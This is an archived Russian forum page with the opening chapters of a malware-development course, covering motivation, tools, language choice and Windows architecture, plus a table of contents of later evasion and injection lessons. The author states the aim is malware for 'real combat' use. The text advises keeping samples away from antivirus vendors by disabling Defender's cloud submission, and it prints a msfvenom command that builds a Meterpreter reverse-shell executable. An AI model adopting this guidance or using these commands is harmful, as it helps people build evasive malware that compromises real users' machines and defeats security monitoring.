ya-page_js_yes';}s.type='text/javascript';s.async=true;s.charset='utf-8';s.src=(d.location.protocol==='https:'?'https:':'http:')+'//site.yandex.net/v2.0/js/all.js';h.parentNode.insertBefore(s,h);(w[c]||(w[c]=[])).push(function(){Ya.Site.Form.init()})})(window,document,'yandex_site_callbacks');</script>
      <!-- Notice -->
      <p style="margin:15px 0 0;
                padding:10px;
                border-radius:6px;
                background:#ffeaea;
                color:#c0392b;
                font-weight:bold;
                text-align:center;">
        ⚠️ Это архив форума, в ближайшее время поддержка ресурса не планируется!
      </p>

    </div>
  </div>
</div>
		</div>
	</li>

			
		</ul>
	

			

			

			
			
	
		<ul class="p-breadcrumbs "
			itemscope itemtype="https://schema.org/BreadcrumbList">
			
				

				
				

				

				
				
					
					
	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
		<a href="../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html" itemprop="item">
			<span itemprop="name">Уроки разработки вредоносного софта</span>
		</a>
		<meta itemprop="position" content="1" />
	</li>

				
			
		</ul>
	

			

			
	<noscript class="js-jsWarning"><div class="blockMessage blockMessage--important blockMessage--iconic u-noJsOnly">JavaScript отключён. Для полноценно использования нашего сайта, пожалуйста, включите JavaScript в своём браузере.</div></noscript>

			
	<div class="blockMessage blockMessage--important blockMessage--iconic js-browserWarning" style="display: none">Вы используете устаревший браузер. Этот и другие сайты могут отображаться в нем неправильно.<br />Необходимо обновить браузер или попробовать использовать <a href="https://www.google.com/chrome/" target="_blank" rel="noopener">другой</a>.</div>


			
				<div class="p-body-header">
					
		<div class="contentRow contentRow--hideFigureNarrow">
			<div class="contentRow-main">
				<div class="p-title">
					<h1 class="p-title-value">
						
							
							Цикл статей &quot;Изучение вредоносных программ&quot;
						
					</h1>
				</div>
				
					<div class="p-description">
						
							<ul class="listInline listInline--bullet">
								<li>
									<i class="fa--xf far fa-user "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Автор</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#user"></use></svg></i>
									<span class="u-srOnly">Автор</span>
									
										<a href="https://osint42.org/members/0x42.1/" class="username  u-concealed" dir="auto" data-user-id="1" data-xf-init="member-tooltip"><span class="username--moderator username--admin">0x42</span></a>
									
								</li>
								
								<li>
									<i class="fa--xf far fa-clock "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Дата публикации</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#clock"></use></svg></i>
									<span class="u-srOnly">Дата публикации</span>

									<a href="index.html" class="u-concealed"><time  class="u-dt" dir="auto" datetime="2025-05-08T13:54:22+0300" data-timestamp="1746701662" data-date="08.05.2025" data-time="13:54" data-short="8 Май" title="08.05.2025 в 13:54">08.05.2025</time></a>
								</li>
																
									<li>
										<i class="fa--xf far fa-clock "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Последнее обновление</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#clock"></use></svg></i>
										<span class="u-concealed">Обновлено</span>

										<time  class="u-dt" dir="auto" datetime="2025-05-09T16:44:30+0300" data-timestamp="1746798270" data-date="09.05.2025" data-time="16:44" data-short="9 Май" title="09.05.2025 в 16:44">09.05.2025</time>
									</li>
								
																
									<li>
										<i class="fa--xf far fa-hourglass "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Article read time</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#hourglass"></use></svg></i>
										<span class="u-srOnly">Article read time</span>

										398 min read
									</li>
								
								
								
									<li><span class="label label--accent">Рекомендуемые</span></li>
								
							</ul>
						
					</div>
				

				

	
		
	

			</div>
		</div>
	
				</div>
				

			<div class="p-body-main p-body-main--withSidebar ">
				
				<div class="p-body-contentCol"></div>
				
					<div class="p-body-sidebarCol"></div>
				

				

				<div class="p-body-content">
					
					<div class="p-body-pageContent">









	

	



	
	

	




	




	







	




	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	
	
		
	
	
	


	







	
		
		

		
			<script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script class="js-extraPhrases" type="application/json">
			{
				"lightbox_close": "Закрыть",
				"lightbox_next": "Следующая",
				"lightbox_previous": "Предыдущая",
				"lightbox_error": "Запрошенный контент не может быть загружен. Пожалуйста, попробуйте позже.",
				"lightbox_start_slideshow": "Запустить слайд-шоу",
				"lightbox_stop_slideshow": "Остановить слайд-шоу",
				"lightbox_full_screen": "Полный экран",
				"lightbox_thumbnails": "Миниатюры",
				"lightbox_download": "Скачать",
				"lightbox_share": "Поделиться",
				"lightbox_zoom": "Увеличить",
				"lightbox_new_window": "Новое окно",
				"lightbox_toggle_sidebar": "Переключить боковую панель"
			}
			</script>
		
		
	


<div class="block">
	
		<div class="block-outer">
			<div class="block-outer-opposite">
			
				

	

	

	

	

	

	

	

	
		<div class="buttonGroup">
		
			

			
			
			
			

	

			
			
				<div class="buttonGroup-buttonWrapper">
					<button type="button" class="button button--link menuTrigger" data-xf-click="menu" aria-expanded="false" aria-haspopup="true" title="Навигация по страницам"><span class="button-text">
						ОГЛАВЛЕНИЕ
					</span></button>
					<div class="menu" data-menu="menu" aria-hidden="true">
						<div class="menu-content">
							<h4 class="menu-header">Выберите страницу</h4>

							<a href="index.html" class="menu-linkRow ">
								
									Зачем изучать разработку вредоносных программ ?
								
							</a>

							
								
									<a href="page/instrumenty.1/index.html" class="menu-linkRow ">
									 Инструменты</a>
								
									<a href="page/tak-kakoi-zhe-yazyk-vybrat.2/index.html" class="menu-linkRow ">
									 Так какой-же язык выбрать !?</a>
								
									<a href="page/shpargalka-po-arkhitekture-vindy.3/index.html" class="menu-linkRow ">
									 Шпаргалка по архитектуре винды</a>
								
									<a href="page/chto-takoye-payload-i-shell-code.5/index.html" class="menu-linkRow ">
									 Что такое payload и shell code</a>
								
									<a href="page/izuchayem-dinamicheskiye-biblioteki.6/index.html" class="menu-linkRow ">
									 Изучаем динамические библиотеки</a>
								
									<a href="page/protsessy-windows.7/index.html" class="menu-linkRow ">
									 Процессы Windows</a>
								
									<a href="page/vidy-detektov.8/index.html" class="menu-linkRow ">
									 Виды детектов</a>
								
									<a href="page/kuda-klast-nagruzku.9/index.html" class="menu-linkRow ">
									 Куда класть нагрузку ?</a>
								
									<a href="page/shifruyem-payload.10/index.html" class="menu-linkRow ">
									 Шифруем Payload</a>
								
									<a href="page/obfuskatsiya-payload.11/index.html" class="menu-linkRow ">
									 Обфускация Payload</a>
								
									<a href="page/lokal-nyi-zapusk-payload.12/index.html" class="menu-linkRow ">
									 Локальный запуск Payload</a>
								
									<a href="page/in-yektsiya-v-protsess.13/index.html" class="menu-linkRow ">
									 Иньекция в процесс</a>
								
									<a href="page/in-yektsiya-shell-koda-v-protsess.14/index.html" class="menu-linkRow ">
									 Инъекция шелл-кода в процесс</a>
								
									<a href="page/razmeshchayem-payload-udalenno-na-servere.15/index.html" class="menu-linkRow ">
									 Размещаем Payload удаленно на сервере</a>
								
									<a href="page/pryachem-payload-v-reyestre.16/index.html" class="menu-linkRow ">
									 Прячем Payload в реестре</a>
								
									<a href="page/razborka-s-tsifrovoi-podpis-yu-zver-ka.17/index.html" class="menu-linkRow ">
									 Разборка с цифровой подписью зверька</a>
								
									<a href="page/izuchayem-tekhniku-thread-hijacking.18/index.html" class="menu-linkRow ">
									 Изучаем технику Thread Hijacking</a>
								
									<a href="page/opredeleniye-pid-nuzhnogo-protsessa-ili-perechisleniya-protsessov.19/index.html" class="menu-linkRow ">
									 Определение PID нужного процесса, или перечисления процессов</a>
								
									<a href="page/izuchayem-tekhniku-apc-injection.20/index.html" class="menu-linkRow ">
									 Изучаем технику APC Injection</a>
								
									<a href="page/vyzov-koda-cherez-funktsii-obratnogo-vyzova.21/index.html" class="menu-linkRow ">
									 Вызов кода через функции обратного вызова</a>
								
									<a href="page/in-yektsiya-otobrazhayemoi-pamyati.22/index.html" class="menu-linkRow ">
									 Инъекция отображаемой памяти</a>
								
									<a href="page/izuchayem-tekhniku-stomping-injection.23/index.html" class="menu-linkRow ">
									 Изучаем технику Stomping Injection</a>
								
									<a href="page/kontrol-vypolneniya-poleznoi-nagruzki.24/index.html" class="menu-linkRow ">
									 Контроль выполнения полезной нагрузки</a>
								
									<a href="page/izuchayem-tekhniku-spoofing.25/index.html" class="menu-linkRow ">
									 Изучаем технику Spoofing</a>
								
									<a href="page/skrytiye-strok.26/index.html" class="menu-linkRow ">
									 Скрытие строк</a>
								
									<a href="page/izuchayem-kungfu-1-skrytiye-tablitsy-importa.27/index.html" class="menu-linkRow ">
									 Изучаем кунгфу-1. Скрытие таблицы импорта</a>
								
									<a href="page/kungfu-2-izuchayem-api-hooking.28/index.html" class="menu-linkRow ">
									 Кунгфу-2.Изучаем API Hooking</a>
								
									<a href="page/predel-naya-tekhnika-razborka-s-siskolami.29/index.html" class="menu-linkRow ">
									 Предельная техника. Разборка с сисколами</a>
								
									<a href="page/predel-naya-tekhnika-2-praktika-realizuyem-tekhniki-in-yektsii-cherez-siskoly.30/index.html" class="menu-linkRow ">
									 Предельная техника-2. Практика. Реализуем техники инъекции через сисколы</a>
								
									<a href="page/cherpayem-sily-v-antiotladke.31/index.html" class="menu-linkRow ">
									 Черпаем силы в антиотладке</a>
								
									<a href="page/obkhod-virtual-nykh-mashin.32/index.html" class="menu-linkRow ">
									 Обход виртуальных машин</a>
								
									<a href="page/otkryvayem-vrata-ada.33/index.html" class="menu-linkRow ">
									 Открываем врата ада</a>
								
									<a href="page/umen-sheniye-veroyatnosti-detekta-zver-ka.34/index.html" class="menu-linkRow ">
									 Уменьшение вероятности детекта зверька</a>
								
									<a href="page/obkhod-windows-defender.35/index.html" class="menu-linkRow ">
									 Обход Windows defender</a>
								
									<a href="page/pro-endpoint-detection-and-response-edr.36/index.html" class="menu-linkRow ">
									 Про Endpoint Detection and Response (EDR)</a>
								
									<a href="page/pro-detekt-v-pamyati-nichego-ne-podelayesh-i-eto-neizbezhno.37/index.html" class="menu-linkRow ">
									 Про детект в памяти. Ничего не поделаешь и это неизбежно)</a>
								
									<a href="page/ogromnaya-baza-iskhodnikov-sovremennykh-virusov-dlya-raznykh-platform.38/index.html" class="menu-linkRow ">
									 Огромная база исходников современных вирусов для разных платформ</a>
								
									<a href="page/kak-rootkit-zagruzit-ili-zhe-kak-zagruzit-draiver-bez-podpisi.39/index.html" class="menu-linkRow ">
									 Как RootKit загрузить или же как загрузить драйвер без подписи</a>
								
									<a href="page/obkhod-amsi.40/index.html" class="menu-linkRow ">
									 Обход AMSI</a>
								
									<a href="page/obkhod-amsi-pri-pomoshchi-khardvarnykh-tochek-ostanova.41/index.html" class="menu-linkRow ">
									 Обход AMSI при помощи хардварных точек останова</a>
								
									<a href="page/uklonyayemsya-ot-povedencheskogo-detekta-antivirusa-i-edr.42/index.html" class="menu-linkRow ">
									 Уклоняемся от поведенческого детекта антивируса и EDR</a>
								
									<a href="page/obkhodim-antivirusy-i-edr.43/index.html" class="menu-linkRow ">
									 Обходим антивирусы и EDR</a>
								
									<a href="page/mutationgate-novyi-podkhod-raboty-s-siskolami.44/index.html" class="menu-linkRow ">
									 MutationGate - Новый подход работы с сисколами</a>
								
									<a href="page/razrabotka-nastoyashchego-virusa-v-2024-godu.45/index.html" class="menu-linkRow ">
									 Разработка настоящего вируса в 2024 году</a>
								
							
							
								<a href="index9401.html?full=1" class="menu-linkRow is-selected">Просмотреть всю статью</a>
							
						</div>
					</div>
				</div>
			

			

			
		
		</div>
	
				
			
			</div>
		</div>
	

	
	
		
	
	
	
	<div class="block-container">
		<div class="block-body lbContainer js-articleBody"
			data-xf-init="lightbox"
			data-lb-id="article-6"
			data-lb-caption-desc="0x42 &middot; 08.05.2025 в 13:54"
			id="js-articleBody-6">

			<div class="articleBody">
				<article class="articleBody-main js-lbContainer">
					
					
					
					
						

	
		
	

					

					

						
							<h2>Зачем изучать разработку вредоносных программ ?</h2>
						

						<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="872828dd-ac69-4f8f-8ea3-10beaea13fb9.png"
		data-src="https://osint42.org/attachments/872828dd-ac69-4f8f-8ea3-10beaea13fb9-png.461/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/872828dd-ac69-4f8f-8ea3-10beaea13fb9-png.461/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="872828dd-ac69-4f8f-8ea3-10beaea13fb9.png"
			title="872828dd-ac69-4f8f-8ea3-10beaea13fb9.png"
			width="512" height="512" loading="lazy" />
	</div><br />
<br />
Всем привет!<br />
<br />
Решил перепостить свой цикл статей по разработки малвари.<br />
<br />
Статьи будут оформлены в виде цикла статей.)<br />
<br />
<b><u>Зачем изучать разработку вредоносных программ ?</u></b><br />
<br />
Есть несколько причин, по которым кто-то хотел бы изучить разработку вредоносных программ.<br />
<br />
С точки зрения тестирования на проникновение часто необходимо выполнять определенные вредоносные задачи в среде клиента.<br />
<br />
У тестировщиков обычно есть три основных варианта выбора инструментов для атаки:<br />
<br />
1. Инструменты с открытым исходным кодом — эти инструменты, как правило обнаруживаются любым средствами защиты и без каких-то доработок мало пригодны для атак.<br />
<br />
2. Покупка инструментов. Команды с большими бюджетами часто предпочитают покупать инструменты, чтобы сэкономить драгоценное время во время заданий.<br />
<br />
3. Разработка пользовательских инструментов. Поскольку эти инструменты создаются по индивидуальному заказу, они имеют больше шансов найти какие-то уязвимости в системе и проверить какие-то нестандартные части системы.<br />
Именно здесь знания о разработке вредоносных программ становятся первостепенными для более успешной оценки безопасности.<br />
<br />
<b>Какой язык программирования следует использовать?</b><br />
<br />
С технической точки зрения для создания вредоносного ПО можно использовать любой язык программирования, например Python, PowerShell, C#, C, C++ и Go.<br />
<br />
Есть несколько причин, по которым одни языки программирования преобладают над другими, когда дело доходит до разработки вредоносных программ, и это<br />
обычно сводится к следующим пунктам:<br />
<br />
- Некоторые языки не имеют нужного функционала, например прямой доступ к ОЗУ по указателям и т.д.<br />
<br />
- Другие языки не позволяют быстро выполнить нужную задачу, например тот-же язык Си не имеет функционала которым может похвастаться C# или Python, например есть задачи которые на том-же Python можно решить за пару строчек кода, а в Си это будет портянка на несколько десятков тысяч строк.<br />
<br />
- Но минусы Python и C#, что требуется интерпретатор, который должен присутствовать на целевой машине, что уже осложняет атаку.<br />
<br />
- Также при выборе языка нужно учитывать знание и опыт разработчика.<br />
<br />
<b>Языки программирования можно разделить на две разные группы: высокоуровневые и низкоуровневые.</b><br />
<br />
Высокий уровень — как правило, более абстрагирован от операционной системы, менее эффективен при работе с памятью и часто для безопасности ограничивает некоторый функционал программисту.<br />
Примером языка программирования высокого уровня является Python, С#.<br />
<br />
Низкоуровневый — обеспечивает способ взаимодействия с операционной системой на более близком уровне, а также предоставляет разработчику больше свободы при<br />
взаимодействуя с системой. Пример низкоуровневого языка программирования Си, Ассемблер.<br />
<br />
<b>Отмечу это разделение условное, но нужно понимать ещё, что есть языки которые требуют интерпретатор для запуска программы (Python, Java и т.д.) и которые не требуют, т.е. будет собран бинарный исполняемый образ, для запуска которого ничего не нужно (Такие как Си, С++, Rust и т.д.).<br />
<br />
Разработка вредоносных программ для Windows</b><br />
<br />
Сцена разработки вредоносных программ для Windows изменилась за последние несколько лет и теперь в значительной степени сосредоточена на обходе защиты.<br />
С развитием технологии уже недостаточно создавать вредоносное ПО, которое выполняет подозрительные команды или выполняет «вредоносные» действия.<br />
<br />
<b>Целью этих статей научить вас создавать вредоносное ПО, которое можно использовать в реальных боевых действиях.<br />
<br />
Жизненный цикл разработки вредоносного ПО</b><br />
<br />
По сути, вредоносное ПО — это часть программного обеспечения, предназначенная для выполнения определенных действий. Успешная реализация программного обеспечения требует процесса<br />
известного как жизненный цикл разработки программного обеспечения (SDLC).<br />
<br />
Точно так же хорошо построенное и сложное вредоносное ПО потребует специализированной версии SDLC, называемый жизненным циклом разработки вредоносных программ (MDLC).<br />
<br />
<b>MDLC может состоять из 5 основных этапов:</b><br />
<br />
1. Разработка. Начните разработку или усовершенствование функциональности вредоносного ПО.<br />
<br />
2. Тестирование. Выполните тесты, чтобы выявить скрытые ошибки в уже разработанном коде.<br />
<br />
3. Тестирование AV/EDR в автономном режиме. Запускайте разработанное вредоносное ПО с максимально возможным количеством продуктов безопасности. Важно, чтобы тестирование проводилось в автономном режиме, <b>чтобы убедиться, что образцы не отправляются поставщикам средств обеспечения безопасности.</b><br />
<br />
При использовании Microsoft Defender это достигается за счет отключения автоматической отправки образцов и облачной защиты.<br />
Хотя такое отключение не позволит в полной мере протестировать защиту.<br />
<br />
4. Онлайн-тестирование AV/EDR. Запустите разработанное вредоносное ПО против продуктов безопасности, подключенных к Интернету. Облачные движки часто являются ключевыми компонентов в AV/EDR, <b>и поэтому тестирование вашего вредоносного ПО на эти компоненты имеет решающее значение для получения более точных результатов.</b><br />
Будьте осторожны так как этот шаг может привести к отправке в образцов в облачный механизм решения безопасности.<br />
<br />
5. Анализ. На этом этапе необходимо понять какие средства безопасности блокируют ваше ПО, на сколько это критично и т.д.<br />
<br />
На этом закончу!)<br />
<br />
Пишите комментарии, следующие статьи будут более предметными, разберём инструменты разработки, потом будет небольшая статья по архитектуре винды и вперёд.</div>

						

							<h2>Инструменты</h2>

							

							

							<div class="bbWrapper">В предыдущей части мы затронули, зачем вообще разрабатывать вредоносное ПО, рассмотрели жизненный цикл такого ПО и немного затронули выбор языка разработки.<br />
<br />
<br />
<br />
Перед началом путешествия по разработке вредоносного программного обеспечения необходимо подготовить рабочее пространство, установив инструменты для разработки вредоносных программ, а также их отладки.<br />
<br />
Эти инструменты будут полезны в процессе разработки и анализа вредоносного программного обеспечения.<br />
<br />
Отмечу что пока мы будем рассматривать ОС Windows, т.к. большинство малвари пишут именно под эту ОС, но также в будущем хочу затронуть Линукс и может-быть несколько статей будут затрагивать обсуждение малвари для мобильных устройств.)<br />
<br />
<b>Инструменты разработки/отладки и исследования программ</b><br />
<br />
Установите следующие инструменты:<br />
<br />
<b>Visual Studio</b> - это среда разработки, в которой будет происходить процесс написания и компиляции кода. Установите C/C++ Runtime.<br />
<br />
<b>x64dbg - x64dbg</b> - это отладчик, который будет использоваться во всех следующих статьях для получения внутреннего понимания разработанной вредоносной программы.<br />
<br />
<b>PE-Bear - PE-bear </b>- это многофункциональный инструмент обратной разработки для файлов РЕ. Он также будет использоваться для оценки разработанной вредоносной программы и поиска подозрительных признаков.<br />
<br />
<b>Process Hacker 2 </b>- Process Hacker - это мощный универсальный инструмент, который помогает отслеживать ресурсы системы, отлаживать программное обеспечение и обнаруживать вредоносные программы.<br />
<br />
<b>Wireshark</b> – это широко распространённый инструмент для захвата и анализа сетевого трафика, который активно используется как для образовательных целей, так и для устранения неполадок на компьютере или в сети.<br />
<br />
<b>Msfvenom</b> - это инструмент интерфейса командной строки, который используется для создания пэйлоадов для разных платформ.<br />
<br />
<b>Рассмотрим эти инструменты более подробно:<br />
<br />
Visual Studio</b> - это интегрированная среда разработки (IDE), разработанная Microsoft. Она используется для разработки широкого спектра программного обеспечения, такого как веб-приложения, веб-сервисы и компьютерные программы.<br />
<br />
Он также поставляется с инструментами разработки и отладки для создания и тестирования приложений.<br />
<br />
Visual Studio будет основной средой разработки, используемой в этом курсе.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746701868040.png"
		data-src="https://osint42.org/attachments/1746701868040-png.14/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746701868040-png.14/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746701868040.png"
			title="1746701868040.png"
			width="973" height="659" loading="lazy" />
	</div><br />
<br />
<br />
<br />
<br />
<b>x64dbg</b> - это отладочная утилита с открытым исходным кодом для x64 и x86 бинарных файлов Windows.<br />
<br />
Она используется для анализа и отладки приложений в пользовательском режиме и драйверов в режиме ядра.<br />
<br />
Она предоставляет графический интерфейс пользователя, который позволяет пользователям проверять и анализировать состояние своих программ, просматривать содержимое памяти, инструкции ассемблера и значения регистров.<br />
<br />
С помощью x64dbg пользователи могут устанавливать точки останова, просматривать данные стека и кучи, выполнять пошаговое выполнение кода, читать и записывать значения памяти.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746701876262.png"
		data-src="https://osint42.org/attachments/1746701876262-png.15/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746701876262-png.15/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746701876262.png"
			title="1746701876262.png"
			width="974" height="490" loading="lazy" />
	</div><br />
<br />
<br />
<b>PE-Bear</b> - это бесплатный инструмент с открытым исходным кодом, разработанный для помощи аналитикам вредоносного программного обеспечения и обратной разработки в быстром и простом анализе исполняемых файлов Windows Portable Executable (PE).<br />
<br />
Он помогает анализировать и визуализировать структуру файла PE, просматривать импорты и экспорты каждого модуля и выполнять статический анализ для обнаружения аномалий и возможного вредоносного кода. PE-bear также включает функции проверки заголовка PE и секций, а также шестнадцатеричного редактора.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746701886606.png"
		data-src="https://osint42.org/attachments/1746701886606-png.16/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746701886606-png.16/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746701886606.png"
			title="1746701886606.png"
			width="974" height="600" loading="lazy" />
	</div><br />
<br />
<br />
<b>Process Hacker</b> - это инструмент с открытым исходным кодом для просмотра и управления процессами и службами в операционной системе Windows.<br />
<br />
Он похож на диспетчер задач, но предоставляет больше информации и расширенные функции.<br />
<br />
С его помощью можно завершать процессы и службы, просматривать подробную информацию и статистику о процессах, устанавливать приоритеты процессов и многое другое.<br />
<br />
Process Hacker будет полезен при анализе работающих процессов для просмотра таких элементов, как загруженные DLL-библиотеки и области памяти.<br />
<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746701914033.png"
		data-src="https://osint42.org/attachments/1746701914033-png.19/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746701914033-png.19/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746701914033.png"
			title="1746701914033.png"
			width="974" height="675" loading="lazy" />
	</div><br />
<br />
<br />
<br />
<b>Wireshark</b> – это широко распространённый инструмент для захвата и анализа сетевого трафика, который активно используется как для образовательных целей, так и для устранения неполадок на компьютере или в сети.<br />
<br />
Wireshark работает практически со всеми протоколами модели OSI, обладает понятным для обычного пользователя интерфейсом и удобной системой фильтрации данных. Помимо всего этого, программа является кроссплатформенной и поддерживает следующие операционные системы: Windows, Linux, Mac OS X, Solaris, FreeBSD, NetBSD, OpenBSD.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746703268574.png"
		data-src="https://osint42.org/attachments/1746703268574-png.20/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746703268574-png.20/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746703268574.png"
			title="1746703268574.png"
			width="978" height="726" loading="lazy" />
	</div><br />
<br />
<br />
<b>Msfvenom</b> - это генератор независимых нагрузок (payload) фреймворка Metasploit, который позволяет пользователям создавать различные типы нагрузок.<br />
<br />
Эти нагрузки будут использоваться в создаваемом вредоносном программном обеспечении в рамках данного курса.<br />
<br />
Также является заменой для инструментов msfpayload и msfencode.<br />
<br />
Использование: /usr/bin/msfvenom [опции] &lt;var=val&gt;<br />
<br />
Пример: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe<br />
<br />
Опции:<br />
<br />


<details class="spoiler">
  <summary>Спойлер: Опции</summary>
  <div>
-1, --list &lt;type&gt; Список всех модулей.<br />
<br />
Типы: payloads, encoders, nops, platforms, archs, encrypt, formats, all.<br />
<br />
-p, --payload &lt;payload&gt; Используемая нагрузка (используйте --list payloads для просмотра списка, --list-options для аргументов).<br />
<br />
--list-options Список стандартных, расширенных опций для --payload &lt;value&gt;.<br />
<br />
-f, --format &lt;format&gt; Формат вывода (используйте --list formats для списка форматов).<br />
<br />
-e, --encoder &lt;encoder&gt; Используемый энкодер (используйте --list encoders для просмотра списка).<br />
<br />
--service-name &lt;value&gt; Имя службы при создании исполняемого файла службы.<br />
<br />
--sec-name &lt;value&gt; Новое имя раздела при создании крупных исполняемых файлов для Windows. По умолчанию: случайная строка из 4 символов.<br />
<br />
--smallest Генерация наименьшей возможной нагрузки, используя все доступные энкодеры.<br />
<br />
--encrypt &lt;value&gt; Тип шифрования или кодирования для применения к коду оболочки (используйте --list encrypt для списка).<br />
<br />
--encrypt-key &lt;value&gt; Ключ для --encrypt.<br />
<br />
--encrypt-iv &lt;value&gt; Вектор инициализации для --encrypt.<br />
<br />
-a, --arch &lt;arch&gt; Архитектура для --payload и --encoders (используйте --list archs для списка).<br />
<br />
--platform &lt;platform&gt; Платформа для --payload (используйте --list platforms для списка).<br />
<br />
-o, --out &lt;path&gt; Сохранить нагрузку в файл.<br />
<br />
-b, --bad-chars &lt;list&gt; Список символов, которых нужно избегать. Пример: &#039;\х@@\х Р&#039;.<br />
<br />
-n, --nopsled &lt;length&gt; Добавить пустой блок заданной длины перед нагрузкой.<br />
<br />
--pad-nops Использовать длину блока, заданную опцией -n &lt;length&gt;, как общий размер нагрузки, автоматически добавляя пустой блок до нужного количества (длина блока минус длина нагрузки).<br />
<br />
-s, --space &lt;length&gt; Максимальный размер результирующей нагрузки.<br />
<br />
--encoder-space &lt;length&gt; Максимальный размер закодированной нагрузки (по умолчанию равен значению опции -s).<br />
<br />
-i, --iterations &lt;count&gt; Количество итераций кодирования нагрузки.<br />
<br />
-c, --add-code &lt;path&gt; Указать дополнительный файл с shell-кодом для включения.<br />
<br />
-x, --template &lt;path&gt; Указать пользовательский исполняемый файл в качестве шаблона.
  </div>
</details></div><br />
<b>Пожалуйста изучите эти инструменты более подробно самостоятельно, к сожалению описывать их более детально нет возможности, в сети статей очень много, далее в следующих статьях будет затронут немного язык Си, а потом немного архитектура ОС.<br />
<br />
Вообще описывать всё подробно очень затратно, поэтому цель этих статей дать направление, если-же вы действительно хотите что-то изучать, то это в основном самостоятельная практика и изучение.<br />
<br />
Но надеюсь эти статьи могут дать какое-то направление…)</b></div>
						

							<h2>Так какой-же язык выбрать !?</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746708542332.png"
		data-src="https://osint42.org/attachments/1746708542332-png.26/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746708542332-png.26/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746708542332.png"
			title="1746708542332.png"
			width="1222" height="650" loading="lazy" />
	</div><br />
<br />
Вообще в сети много холиваров на эту тему.<br />
<br />
Многие представители старой школы отказываются признавать новые технологии и считают разработку малвари, как низкоуровневую разработку, т.е. что-то там на уровне драйверов системы, какое-то аппаратное взаимодействие низкоуровневое, например работа с процессором, реверс и т.д.<br />
<br />
Да, всё это может присутствовать в разработке, <b>но необходимо понимать, что малварь сейчас весьма обширное понятие.<br />
<br />
В общем я считаю, что разработка малвари, это <u>системная разработка, </u></b>ну т.е. нужно понимать в целом как работает система, обладать более глубокими знаниями в устройстве ОС.<br />
<br />
А вот с выбором языка тут всё зависит от самой задачи, знаний языка и т.д.<br />
<br />
Ещё хочется отметить, что существует много наработок уже и инструментов на разных языках, этими инструментами тоже нужно уметь пользоваться.)<br />
<br />
Вот ну и последнее наверное, если почитать этот форум, то используется язык Си в основном, причин этому несколько:<br />
<br />
1. Тут в основном изучение обхода средств защиты и т.д., поэтому язык Си более предпочтителен, т.к. нет ограничений работы с памятью и т.д.<br />
2. Программы собранные компилятором Си легче исследовать, например в том-же дизассемблере.<br />
<br />
Но понятно что куча минусов этого языка, начиная от безопасности и заканчивая отсутствием каких-то фишек, как например в С++, хотя если говорит про С++ там тоже есть не мало минусов, важна практика...)</div>
						

							<h2>Шпаргалка по архитектуре винды</h2>

							

							

							<div class="bbWrapper">Архитектура любой ОС, очень сложная система, так наскоком не изучишь.<br />
<br />
Но т.к. разработка малвари - Это системная разработка, какое-то понимание этой самой архитектуры нужно иметь, поэтому данная шпаргалка даст небольшое понимание, но к сожалению не более того.<img src="../../../cdn.jsdelivr.net/joypixels/assets/8.0/png/unicode/64/1f641.png" class="smilie smilie--emoji" loading="lazy" width="64" height="64" alt=":(" title="Frown    :("  data-smilie="3"data-shortname=":(" /><br />
<br />
Процессор внутри компьютера, на которой работает операционная система Windows, может работать в двух разных режимах: режиме пользователя и режиме ядра.<br />
<br />
Приложения работают в режиме пользователя, а компоненты операционной системы работают в режиме ядра.<br />
<br />
Когда приложение хочет выполнить задачу, например, создать файл, оно не может сделать это самостоятельно.<br />
<br />
Единственная сущность, которая может выполнить задачу - это ядро, поэтому приложения должны следовать определенному порядку вызова функций.<br />
Ниже представлена диаграмма, показывающая высокий уровень этого потока.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709115272.png"
		data-src="https://osint42.org/attachments/1746709115272-png.27/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709115272-png.27/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709115272.png"
			title="1746709115272.png"
			width="1140" height="569" loading="lazy" />
	</div><br />
<br />
<b>Процессы пользователя:</b><br />
<ol>
